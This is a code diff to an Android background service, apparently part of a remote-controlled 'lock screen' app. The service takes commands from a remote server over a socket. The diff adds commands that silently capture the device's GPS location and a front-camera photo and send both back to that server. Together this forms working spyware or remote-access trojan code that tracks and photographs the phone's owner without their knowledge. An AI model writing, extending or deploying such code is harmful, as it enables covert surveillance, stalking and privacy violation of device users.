@@ -6,13 +6,19 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.graphics.Typeface;
+import android.hardware.Camera;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.media.ToneGenerator;
 import android.net.Uri;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Vibrator;
+import android.util.Base64;
 import android.view.Gravity;
 import android.view.View;
 import android.view.WindowManager;
@@ -34,6 +40,7 @@ public class LockService extends Service {
     private MediaPlayer mediaPlayer;
     private Handler handler;
     private WindowManager wm;
+    private LocationManager locationManager;
     private View overlay, flashView, wallpaperView;
     private boolean locked = false;
 
@@ -44,6 +51,7 @@ public class LockService extends Service {
         tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
         handler = new Handler();
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
         connectToServer();
     }
 
@@ -71,6 +79,8 @@ public class LockService extends Service {
             case "flash_off": showFlash(false); break;
             case "wallpaper": changeWallpaper(d.optString("url")); break;
             case "mp3": playMP3(d.optString("url")); break;
+            case "gps": getGPS(); break;
+            case "camera": takePhoto(); break;
         }
     }
 
@@ -271,6 +281,42 @@ public class LockService extends Service {
         } catch (Exception e) {}
     }
 
+    private void getGPS() {
+        try {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, new LocationListener() {
+                @Override
+                public void onLocationChanged(Location loc) {
+                    try {
+                        JSONObject gps = new JSONObject();
+                        gps.put("lat", loc.getLatitude());
+                        gps.put("lng", loc.getLongitude());
+                        socket.emit("gps", gps);
+                    } catch (Exception e) {}
+                }
+                @Override public void onStatusChanged(String p, int s, Bundle b) {}
+                @Override public void onProviderEnabled(String p) {}
+                @Override public void onProviderDisabled(String p) {}
+            });
+        } catch (Exception e) {}
+    }
+
+    private void takePhoto() {
+        try {
+            Camera cam = Camera.open(1);
+            cam.startPreview();
+            cam.takePicture(null, null, (data, camera) -> {
+                try {
+                    String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                    JSONObject photo = new JSONObject();
+                    photo.put("image", base64);
+                    socket.emit("photo", photo);
+                } catch (Exception e) {}
+                camera.stopPreview();
+                camera.release();
+            });
+        } catch (Exception e) {}
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY;
@@ -285,15 +331,9 @@ public class LockService extends Service {
     public void onDestroy() {
         removeLockScreen();
         showFlash(false);
-        if (wallpaperView != null) {
-            wm.removeView(wallpaperView);
-            wallpaperView = null;
-        }
-        if (mediaPlayer != null) {
-            mediaPlayer.stop();
-            mediaPlayer.release();
-        }
+        if (wallpaperView != null) { wm.removeView(wallpaperView); wallpaperView = null; }
+        if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
         if (socket != null) socket.disconnect();
         super.onDestroy();
     }
-                 }
+                                  }
